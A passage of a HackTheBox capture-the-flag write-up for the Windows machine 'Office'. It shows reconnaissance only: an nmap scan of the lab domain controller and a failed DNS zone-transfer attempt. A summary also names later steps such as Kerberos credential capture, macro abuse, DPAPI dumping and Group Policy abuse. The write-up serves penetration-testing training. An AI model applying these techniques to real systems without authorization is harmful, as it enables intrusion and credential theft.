8h14V6H5zm0 0V6z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:calendar-today-outline-rounded></use></svg></div><span class="text-sm text-50 font-medium" data-astro-cid-aj5jodn5>2024-07-01</span></div><div class="flex items-center" data-astro-cid-aj5jodn5><div class=meta-icon data-astro-cid-aj5jodn5><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-aj5jodn5><symbol id=ai:material-symbols:menu-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h16q.425 0 .713.288T21 17t-.288.713T20 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-aj5jodn5><a href=/archive/category/HackTheBox/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts in the HackTheBox category" data-astro-cid-aj5jodn5>HackTheBox</a></div></div><div class="flex items-center" data-astro-cid-aj5jodn5><div class=meta-icon data-astro-cid-aj5jodn5><svg data-icon=material-symbols:tag-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-aj5jodn5><symbol id=ai:material-symbols:tag-rounded><path d="m9 16l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T6.3 18.8L7 16H4.275q-.5 0-.8-.387T3.3 14.75q.075-.35.35-.55t.625-.2H7.5l1-4H5.775q-.5 0-.8-.387T4.8 8.75q.075-.35.35-.55t.625-.2H9l.825-3.275Q9.9 4.4 10.15 4.2t.6-.2q.475 0 .775.375t.175.825L11 8h4l.825-3.275q.075-.325.325-.525t.6-.2q.475 0 .775.375t.175.825L17 8h2.725q.5 0 .8.387t.175.863q-.075.35-.35.55t-.625.2H16.5l-1 4h2.725q.5 0 .8.388t.175.862q-.075.35-.35.55t-.625.2H15l-.825 3.275q-.075.325-.325.525t-.6.2q-.475 0-.775-.375T12.3 18.8L13 16zm.5-2h4l1-4h-4z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:tag-rounded></use></svg></div><div class="flex items-center flex-row flex-nowrap" data-astro-cid-aj5jodn5><div class="text-sm mx-1.5 text-[var(--meta-divider)] hidden" data-astro-cid-aj5jodn5>/</div><a href=/archive/tag/Windows/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Windows tag" data-astro-cid-aj5jodn5>Windows</a><div class="text-sm mx-1.5 text-[var(--meta-divider)]" data-astro-cid-aj5jodn5>/</div><a href=/archive/tag/Hard/ class="transition whitespace-nowrap font-medium dark:hover:text-[var(--primary)] hover:text-[var(--primary)] link-lg text-50 text-sm" aria-label="View all posts with the Hard tag" data-astro-cid-aj5jodn5>Hard</a></div></div></div></div><div class="overflow-hidden relative rounded-xl onload-animation banner-container mb-8"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="" decoding=async height=375 loading=lazy src=/_astro/offi.Dd6aq1pv_219AEC.webp width=666 class="w-full h-full object-cover" style=object-position:center></div><div class="onload-animation mb-6 custom-md dark:prose-invert markdown-content max-w-none prose prose-base" data-pagefind-body><h1 id=description>Description<a href=#description class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><ul><li>Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the <code>MacroSecurityLevel</code> registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges.</li></ul><h1 id=information-gathering>Information Gathering<a href=#information-gathering class=anchor><span class=anchor-icon data-pagefind-ignore="">#</span></a></h1><ul><li>The pentester begins with a port scan and discovers that the ports <code>53, 80, 88, 139, 389, 443, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 49664, 49668, 57166, 57326, 57333, 57357</code> are open, typical on Windows targets. He notices the presence of the domain <code>office.htb</code> and the DNS name <code>dc.office.htb</code>, so he adds them to the <code>/etc/hosts</code> file.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>Nmap</span><span style=color:#9ecbff> scan</span><span style=color:#9ecbff> report</span><span style=color:#9ecbff> for</span><span style=color:#79b8ff> 10.10.11.3</span></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#9ecbff> is</span><span style=color:#9ecbff> up</span><span style=color:#e1e4e8> (0.13s </span><span style=color:#9ecbff>latency</span><span style=color:#e1e4e8>).</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>PORT</span><span style=color:#9ecbff>      STATE</span><span style=color:#9ecbff> SERVICE</span><span style=color:#9ecbff>       VERSION</span></span>
<span class=line><span style=color:#b392f0>53/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>  domain</span><span style=color:#9ecbff>        Simple</span><span style=color:#9ecbff> DNS</span><span style=color:#9ecbff> Plus</span></span>
<span class=line><span style=color:#b392f0>80/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>  http</span><span style=color:#9ecbff>          Apache</span><span style=color:#9ecbff> httpd</span><span style=color:#79b8ff> 2.4.56</span><span style=color:#e1e4e8> ((Win64) OpenSSL/1.1.1t PHP/8.0.28)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-title:</span><span style=color:#9ecbff> Home</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-generator:</span><span style=color:#9ecbff> Joomla!</span><span style=color:#9ecbff> -</span><span style=color:#9ecbff> Open</span><span style=color:#9ecbff> Source</span><span style=color:#9ecbff> Content</span><span style=color:#9ecbff> Management</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> http-methods:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#9ecbff>  Supported</span><span style=color:#9ecbff> Methods:</span><span style=color:#9ecbff> GET</span><span style=color:#9ecbff> HEAD</span><span style=color:#9ecbff> POST</span><span style=color:#9ecbff> OPTIONS</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-server-header:</span><span style=color:#9ecbff> Apache/2.4.56</span><span style=color:#e1e4e8> (Win64) OpenSSL/1.1.1t PHP/8.0.28</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-favicon:</span><span style=color:#9ecbff> Unknown</span><span style=color:#9ecbff> favicon</span><span style=color:#9ecbff> MD5:</span><span style=color:#9ecbff> 1B6942E22443109DAEA739524AB74123</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> http-robots.txt:</span><span style=color:#79b8ff> 16</span><span style=color:#9ecbff> disallowed</span><span style=color:#9ecbff> entries</span><span style=color:#e1e4e8> (15 </span><span style=color:#9ecbff>shown</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> /joomla/administrator/</span><span style=color:#9ecbff> /administrator/</span><span style=color:#9ecbff> /api/</span><span style=color:#9ecbff> /bin/</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> /cache/</span><span style=color:#9ecbff> /cli/</span><span style=color:#9ecbff> /components/</span><span style=color:#9ecbff> /includes/</span><span style=color:#9ecbff> /installation/</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_/language/</span><span style=color:#9ecbff> /layouts/</span><span style=color:#9ecbff> /libraries/</span><span style=color:#9ecbff> /logs/</span><span style=color:#9ecbff> /modules/</span><span style=color:#9ecbff> /plugins/</span></span>
<span class=line><span style=color:#b392f0>88/tcp</span><span style=color:#9ecbff>    open</span><span style=color:#9ecbff>  kerberos-sec</span><span style=color:#9ecbff>  Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> Kerberos</span><span style=color:#e1e4e8> (server </span><span style=color:#9ecbff>time:</span><span style=color:#9ecbff> 2024-06-19</span><span style=color:#9ecbff> 08:28:35Z</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#b392f0>139/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  netbios-ssn</span><span style=color:#9ecbff>   Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> netbios-ssn</span></span>
<span class=line><span style=color:#b392f0>389/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ldap</span><span style=color:#9ecbff>          Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> Active</span><span style=color:#9ecbff> Directory</span><span style=color:#9ecbff> LDAP</span><span style=color:#e1e4e8> (Domain: </span><span style=color:#9ecbff>office.htb0.,</span><span style=color:#9ecbff> Site:</span><span style=color:#9ecbff> Default-First-Site-Name</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_ssl-date:</span><span style=color:#9ecbff> 2024-06-19T08:30:05+00:00</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>+8h00m02s</span><span style=color:#9ecbff> from</span><span style=color:#9ecbff> scanner</span><span style=color:#9ecbff> time.</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> ssl-cert:</span><span style=color:#9ecbff> Subject:</span><span style=color:#9ecbff> commonName=DC.office.htb</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Subject</span><span style=color:#9ecbff> Alternative</span><span style=color:#9ecbff> Name:</span><span style=color:#9ecbff> othername:</span><span style=color:#9ecbff> 1.3.6.1.4.1.311.25.1::</span><span style=color:#f97583>&#x3C;</span><span style=color:#9ecbff>unsupporte</span><span style=color:#e1e4e8>d</span><span style=color:#f97583>></span><span style=color:#9ecbff>,</span><span style=color:#9ecbff> DNS:DC.office.htb</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Issuer:</span><span style=color:#9ecbff> commonName=office-DC-CA</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> type:</span><span style=color:#9ecbff> rsa</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> bits:</span><span style=color:#79b8ff> 2048</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Signature</span><span style=color:#9ecbff> Algorithm:</span><span style=color:#9ecbff> sha256WithRSAEncryption</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> before:</span><span style=color:#9ecbff> 2023-05-10T12:36:58</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> after:</span><span style=color:#9ecbff>  2024-05-09T12:36:58</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> MD5:</span><span style=color:#9ecbff>   b83f:ab78:db28:734d:de84:11e9:420f:8878</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_SHA-1:</span><span style=color:#9ecbff> 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4</span></span>
<span class=line><span style=color:#b392f0>443/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ssl/http</span><span style=color:#9ecbff>      Apache</span><span style=color:#9ecbff> httpd</span><span style=color:#79b8ff> 2.4.56</span><span style=color:#e1e4e8> (OpenSSL/1.1.1t </span><span style=color:#9ecbff>PHP/8.0.28</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-server-header:</span><span style=color:#9ecbff> Apache/2.4.56</span><span style=color:#e1e4e8> (Win64) OpenSSL/1.1.1t PHP/8.0.28</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-title:</span><span style=color:#79b8ff> 403</span><span style=color:#9ecbff> Forbidden</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> tls-alpn:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#9ecbff>  http/1.1</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> ssl-cert:</span><span style=color:#9ecbff> Subject:</span><span style=color:#9ecbff> commonName=localhost</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Issuer:</span><span style=color:#9ecbff> commonName=localhost</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> type:</span><span style=color:#9ecbff> rsa</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> bits:</span><span style=color:#79b8ff> 1024</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Signature</span><span style=color:#9ecbff> Algorithm:</span><span style=color:#9ecbff> sha1WithRSAEncryption</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> before:</span><span style=color:#9ecbff> 2009-11-10T23:48:47</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> after:</span><span style=color:#9ecbff>  2019-11-08T23:48:47</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> MD5:</span><span style=color:#9ecbff>   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_SHA-1:</span><span style=color:#9ecbff> b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_ssl-date:</span><span style=color:#9ecbff> TLS</span><span style=color:#9ecbff> randomness</span><span style=color:#9ecbff> does</span><span style=color:#9ecbff> not</span><span style=color:#9ecbff> represent</span><span style=color:#9ecbff> time</span></span>
<span class=line><span style=color:#b392f0>445/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  microsoft-ds?</span></span>
<span class=line><span style=color:#b392f0>464/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  kpasswd5?</span></span>
<span class=line><span style=color:#b392f0>593/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ncacn_http</span><span style=color:#9ecbff>    Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span><span style=color:#9ecbff> over</span><span style=color:#9ecbff> HTTP</span><span style=color:#79b8ff> 1.0</span></span>
<span class=line><span style=color:#b392f0>636/tcp</span><span style=color:#9ecbff>   open</span><span style=color:#9ecbff>  ssl/ldap</span><span style=color:#9ecbff>      Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> Active</span><span style=color:#9ecbff> Directory</span><span style=color:#9ecbff> LDAP</span><span style=color:#e1e4e8> (Domain: </span><span style=color:#9ecbff>office.htb0.,</span><span style=color:#9ecbff> Site:</span><span style=color:#9ecbff> Default-First-Site-Name</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> ssl-cert:</span><span style=color:#9ecbff> Subject:</span><span style=color:#9ecbff> commonName=DC.office.htb</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Subject</span><span style=color:#9ecbff> Alternative</span><span style=color:#9ecbff> Name:</span><span style=color:#9ecbff> othername:</span><span style=color:#9ecbff> 1.3.6.1.4.1.311.25.1::</span><span style=color:#f97583>&#x3C;</span><span style=color:#9ecbff>unsupporte</span><span style=color:#e1e4e8>d</span><span style=color:#f97583>></span><span style=color:#9ecbff>,</span><span style=color:#9ecbff> DNS:DC.office.htb</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Issuer:</span><span style=color:#9ecbff> commonName=office-DC-CA</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> type:</span><span style=color:#9ecbff> rsa</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> bits:</span><span style=color:#79b8ff> 2048</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Signature</span><span style=color:#9ecbff> Algorithm:</span><span style=color:#9ecbff> sha256WithRSAEncryption</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> before:</span><span style=color:#9ecbff> 2023-05-10T12:36:58</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> after:</span><span style=color:#9ecbff>  2024-05-09T12:36:58</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> MD5:</span><span style=color:#9ecbff>   b83f:ab78:db28:734d:de84:11e9:420f:8878</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_SHA-1:</span><span style=color:#9ecbff> 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_ssl-date:</span><span style=color:#9ecbff> 2024-06-19T08:30:06+00:00</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>+8h00m02s</span><span style=color:#9ecbff> from</span><span style=color:#9ecbff> scanner</span><span style=color:#9ecbff> time.</span></span>
<span class=line><span style=color:#b392f0>3268/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  ldap</span><span style=color:#9ecbff>          Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> Active</span><span style=color:#9ecbff> Directory</span><span style=color:#9ecbff> LDAP</span><span style=color:#e1e4e8> (Domain: </span><span style=color:#9ecbff>office.htb0.,</span><span style=color:#9ecbff> Site:</span><span style=color:#9ecbff> Default-First-Site-Name</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> ssl-cert:</span><span style=color:#9ecbff> Subject:</span><span style=color:#9ecbff> commonName=DC.office.htb</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Subject</span><span style=color:#9ecbff> Alternative</span><span style=color:#9ecbff> Name:</span><span style=color:#9ecbff> othername:</span><span style=color:#9ecbff> 1.3.6.1.4.1.311.25.1::</span><span style=color:#f97583>&#x3C;</span><span style=color:#9ecbff>unsupporte</span><span style=color:#e1e4e8>d</span><span style=color:#f97583>></span><span style=color:#9ecbff>,</span><span style=color:#9ecbff> DNS:DC.office.htb</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Issuer:</span><span style=color:#9ecbff> commonName=office-DC-CA</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> type:</span><span style=color:#9ecbff> rsa</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> bits:</span><span style=color:#79b8ff> 2048</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Signature</span><span style=color:#9ecbff> Algorithm:</span><span style=color:#9ecbff> sha256WithRSAEncryption</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> before:</span><span style=color:#9ecbff> 2023-05-10T12:36:58</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> after:</span><span style=color:#9ecbff>  2024-05-09T12:36:58</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> MD5:</span><span style=color:#9ecbff>   b83f:ab78:db28:734d:de84:11e9:420f:8878</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_SHA-1:</span><span style=color:#9ecbff> 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_ssl-date:</span><span style=color:#9ecbff> 2024-06-19T08:30:05+00:00</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>+8h00m02s</span><span style=color:#9ecbff> from</span><span style=color:#9ecbff> scanner</span><span style=color:#9ecbff> time.</span></span>
<span class=line><span style=color:#b392f0>3269/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  ssl/ldap</span><span style=color:#9ecbff>      Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> Active</span><span style=color:#9ecbff> Directory</span><span style=color:#9ecbff> LDAP</span><span style=color:#e1e4e8> (Domain: </span><span style=color:#9ecbff>office.htb0.,</span><span style=color:#9ecbff> Site:</span><span style=color:#9ecbff> Default-First-Site-Name</span><span style=color:#e1e4e8>)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> ssl-cert:</span><span style=color:#9ecbff> Subject:</span><span style=color:#9ecbff> commonName=DC.office.htb</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Subject</span><span style=color:#9ecbff> Alternative</span><span style=color:#9ecbff> Name:</span><span style=color:#9ecbff> othername:</span><span style=color:#9ecbff> 1.3.6.1.4.1.311.25.1::</span><span style=color:#f97583>&#x3C;</span><span style=color:#9ecbff>unsupporte</span><span style=color:#e1e4e8>d</span><span style=color:#f97583>></span><span style=color:#9ecbff>,</span><span style=color:#9ecbff> DNS:DC.office.htb</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Issuer:</span><span style=color:#9ecbff> commonName=office-DC-CA</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> type:</span><span style=color:#9ecbff> rsa</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Public</span><span style=color:#9ecbff> Key</span><span style=color:#9ecbff> bits:</span><span style=color:#79b8ff> 2048</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Signature</span><span style=color:#9ecbff> Algorithm:</span><span style=color:#9ecbff> sha256WithRSAEncryption</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> before:</span><span style=color:#9ecbff> 2023-05-10T12:36:58</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> Not</span><span style=color:#9ecbff> valid</span><span style=color:#9ecbff> after:</span><span style=color:#9ecbff>  2024-05-09T12:36:58</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> MD5:</span><span style=color:#9ecbff>   b83f:ab78:db28:734d:de84:11e9:420f:8878</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_SHA-1:</span><span style=color:#9ecbff> 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_ssl-date:</span><span style=color:#9ecbff> 2024-06-19T08:30:06+00:00</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>+8h00m02s</span><span style=color:#9ecbff> from</span><span style=color:#9ecbff> scanner</span><span style=color:#9ecbff> time.</span></span>
<span class=line><span style=color:#b392f0>5985/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  http</span><span style=color:#9ecbff>          Microsoft</span><span style=color:#9ecbff> HTTPAPI</span><span style=color:#9ecbff> httpd</span><span style=color:#79b8ff> 2.0</span><span style=color:#e1e4e8> (SSDP/UPnP)</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-server-header:</span><span style=color:#9ecbff> Microsoft-HTTPAPI/2.0</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_http-title:</span><span style=color:#9ecbff> Not</span><span style=color:#9ecbff> Found</span></span>
<span class=line><span style=color:#b392f0>9389/tcp</span><span style=color:#9ecbff>  open</span><span style=color:#9ecbff>  mc-nmf</span><span style=color:#9ecbff>        .NET</span><span style=color:#9ecbff> Message</span><span style=color:#9ecbff> Framing</span></span>
<span class=line><span style=color:#b392f0>49664/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  msrpc</span><span style=color:#9ecbff>         Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span></span>
<span class=line><span style=color:#b392f0>49668/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  msrpc</span><span style=color:#9ecbff>         Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span></span>
<span class=line><span style=color:#b392f0>57166/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  msrpc</span><span style=color:#9ecbff>         Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span></span>
<span class=line><span style=color:#b392f0>57326/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  ncacn_http</span><span style=color:#9ecbff>    Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span><span style=color:#9ecbff> over</span><span style=color:#9ecbff> HTTP</span><span style=color:#79b8ff> 1.0</span></span>
<span class=line><span style=color:#b392f0>57333/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  msrpc</span><span style=color:#9ecbff>         Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span></span>
<span class=line><span style=color:#b392f0>57357/tcp</span><span style=color:#9ecbff> open</span><span style=color:#9ecbff>  msrpc</span><span style=color:#9ecbff>         Microsoft</span><span style=color:#9ecbff> Windows</span><span style=color:#9ecbff> RPC</span></span>
<span class=line><span style=color:#b392f0>Service</span><span style=color:#9ecbff> Info:</span><span style=color:#9ecbff> Hosts:</span><span style=color:#9ecbff> DC,</span><span style=color:#9ecbff> www.example.com</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>OS:</span><span style=color:#9ecbff> Windows</span><span style=color:#e1e4e8>; </span><span style=color:#b392f0>CPE:</span><span style=color:#9ecbff> cpe:/o:microsoft:windows</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Host</span><span style=color:#9ecbff> script</span><span style=color:#9ecbff> results:</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> smb2-time:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>   date:</span><span style=color:#9ecbff> 2024-06-19T08:29:28</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#9ecbff>  start_date:</span><span style=color:#9ecbff> N/A</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0> smb2-security-mode:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>   3:1:1:</span><span style=color:#e1e4e8> </span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_</span><span style=color:#9ecbff>    Message</span><span style=color:#9ecbff> signing</span><span style=color:#9ecbff> enabled</span><span style=color:#9ecbff> and</span><span style=color:#9ecbff> required</span></span>
<span class=line><span style=color:#f97583>|</span><span style=color:#b392f0>_clock-skew:</span><span style=color:#9ecbff> mean:</span><span style=color:#9ecbff> 8h00m02s,</span><span style=color:#9ecbff> deviation:</span><span style=color:#9ecbff> 0s,</span><span style=color:#9ecbff> median:</span><span style=color:#9ecbff> 8h00m01s</span></span>
<span class=line></span>
<span class=line><span style=color:#b392f0>Read</span><span style=color:#9ecbff> data</span><span style=color:#9ecbff> files</span><span style=color:#9ecbff> from:</span><span style=color:#9ecbff> /usr/bin/../share/nmap</span></span>
<span class=line><span style=color:#b392f0>Service</span><span style=color:#9ecbff> detection</span><span style=color:#9ecbff> performed.</span><span style=color:#9ecbff> Please</span><span style=color:#9ecbff> report</span><span style=color:#9ecbff> any</span><span style=color:#9ecbff> incorrect</span><span style=color:#9ecbff> results</span><span style=color:#9ecbff> at</span><span style=color:#9ecbff> https://nmap.org/submit/</span><span style=color:#9ecbff> .</span></span>
<span class=line><span style=color:#6a737d># Nmap done at Tue Jun 18 20:30:04 2024 -- 1 IP address (1 host up) scanned in 99.79 seconds</span></span>
<span class=line></span></code></pre><ul><li><strong>DNS Enumeration</strong>: A <code>Domain Zone Transfer</code> attack is not possible on this occasion.</li></ul><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>❯</span><span style=color:#9ecbff> dig</span><span style=color:#9ecbff> axfr</span><span style=color:#9ecbff> office.htb</span><span style=color:#9ecbff> @10.10.11.3</span></span>
<span class=line></span>
